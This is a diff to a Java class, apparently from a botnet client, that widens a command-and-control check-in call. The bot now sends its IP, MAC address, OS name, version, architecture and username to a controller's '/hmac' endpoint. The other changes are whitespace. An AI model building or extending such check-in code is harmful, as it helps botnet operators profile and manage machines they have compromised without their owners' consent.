@@ -177,7 +177,28 @@ public class AsyncRequest {
 	}
 
 	// da valutare se devono essere asincroni
-	public String getResponseFromCeC(String idBot, String Mac, IP dest, String hashMac) {
+	/**
+	 * @param idBot
+	 *            botdata
+	 * @param ip
+	 *            botdata
+	 * @param Mac
+	 *            botdata
+	 * @param os
+	 *            botdata
+	 * @param vers
+	 *            botdata
+	 * @param arch
+	 *            botdata
+	 * @param usrName
+	 *            botdata
+	 * @param dest
+	 *            destinatio ip of request
+	 * @param hashMac
+	 *            mac to be verified
+	 * @return
+	 */
+	public String getResponseFromCeC(String idBot, IP ip, String Mac, String os, String vers, String arch, String usrName, IP dest, String hashMac) {
 		Integer counter = 0;
 		String response = "";
 		while (true) {// (counter <= REQNUMBER) {
@@ -190,10 +211,13 @@ public class AsyncRequest {
 
 				List<Object> objects = new ArrayList<Object>();
 				objects.add(idBot);
+				objects.add(ip);
 				objects.add(Mac);
+				objects.add(os);
+				objects.add(vers);
+				objects.add(arch);
+				objects.add(usrName);
 				objects.add(hashMac);
-				objects.add(System.getProperty("os.name"));
-
 				response = restTemplate.postForObject(HTTPS + dest + PORT + "/hmac", objects, String.class);
 				System.out.println("Ok");
 				return response;
@@ -268,13 +292,12 @@ public class AsyncRequest {
 		// urlParameters.add(new BasicNameValuePair(p.getValue1().toString(),
 		// p.getValue2().toString()));
 		// }
-		
 
 		RequestConfig requestConfig = RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
 				.setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();
 
 		request.setConfig(requestConfig);
-		
+
 		post.setEntity(new StringEntity(raw_data));
 		HttpResponse response = client.execute(post);
 		BufferedReader rd;
